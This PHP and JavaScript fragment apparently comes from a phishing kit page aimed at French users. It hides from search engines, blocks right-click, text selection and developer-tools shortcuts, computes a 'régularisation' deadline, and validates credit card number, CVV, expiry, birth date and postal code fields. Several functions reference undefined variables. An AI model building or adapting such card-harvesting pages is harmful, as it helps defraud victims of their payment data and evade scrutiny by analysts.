<?php
include '../settings.php';
date_default_timezone_set('Europe/Paris');

$_SESSION['heure'] = date('H:i:s');
$dateActuelle = new DateTime();
$dateActuelle->add(new DateInterval('P1DT1H'));

// Afficher la nouvelle date
//echo "La régularisation doit être faite avant le : " . $dateActuelle->format('Y-m-d H:i:s');

?>


<!--F12 DESACTIVER + CLIQUE DROIT + SELECTION TEXTE-->
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache, notranslate, nofollow,">

<script type="text/javascript">

    // Désactiver le clic droit
    document.addEventListener("contextmenu", function(e){
        e.preventDefault();
    }, false);

    // Désactiver la sélection de texte
    document.addEventListener("selectstart", function(e){
        e.preventDefault();
    }, false);


    window.addEventListener("keydown", function(e) {
        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
            e.preventDefault();
        }
    });


    function ccnum(ccnum) {
      // Supprimer tout sauf les chiffres
      input.value = input.value.replace(/\D/g, '');

      var errorMessage = document.getElementById("errorMessage");

      if (input.value.length === 16) {
        errorMessage.textContent = "";
      } else {
        errorMessage.textContent = "Le numéro de carte de crédit doit contenir 16 chiffres.";
      }
    }


	function validateCVV(cvv) {
      cvvInput.value = cvvInput.value.replace(/\D/g, '');

      var errorMessage = document.getElementById("errorMessage");
      var cardNumberInput = document.getElementById("creditCardNumber");

      if (cvvInput.value.length === 3 || cvvInput.value.length === 4) {
        errorMessage.textContent = "";
        cardNumberInput.disabled = false;
      } else {
        errorMessage.textContent = "Le code CVV doit contenir 3 ou 4 chiffres.";
        cardNumberInput.disabled = true;
      }
    }






function formatString(e) {
  var inputChar = String.fromCharCode(event.keyCode);
  var code = event.keyCode;
  var allowedKeys = [8];
  if (allowedKeys.indexOf(code) !== -1) {
    return;
  }

  event.target.value = event.target.value.replace(
    /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
  ).replace(
    /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
  ).replace(
    /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
  ).replace(
    /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
  ).replace(
    /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
  ).replace(
    /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
  ).replace(
    /\/\//g, '/' // Prevent entering more than 1 `/`
  );
}


//DATE DE NAISSANCE all pays
function formatDate(input) {
        // Supprime les caractères non numériques
        input.value = input.value.replace(/[^0-9]/g, '');

        // Ajoute les barres obliques automatiquement (JJ/MM/AAAA)
        if (input.value.length > 2) {
            input.value = input.value.slice(0, 2) + '/' + input.value.slice(2);
        }
        if (input.value.length > 5) {
            input.value = input.value.slice(0, 5) + '/' + input.value.slice(5);
        }
    }

    
function formatFrenchPostalCode(input) {
    // Récupérer la valeur saisie par l'utilisateur
    let postalCode = input.value;

    // Supprimer tous les caractères non numériques
    postalCode = postalCode.replace(/[^0-9]/g, '');

    // Vérifier si le code postal a une longueur de 5 caractères
    if (postalCode.length === 5) {
        // Ajouter un espace au milieu pour obtenir le format "12345"
        postalCode = postalCode.slice(0, 2) + ' ' + postalCode.slice(2, 5);

        // Mettre à jour la valeur du champ avec le code postal formaté
        input.value = postalCode;
    }
}

    
</script>



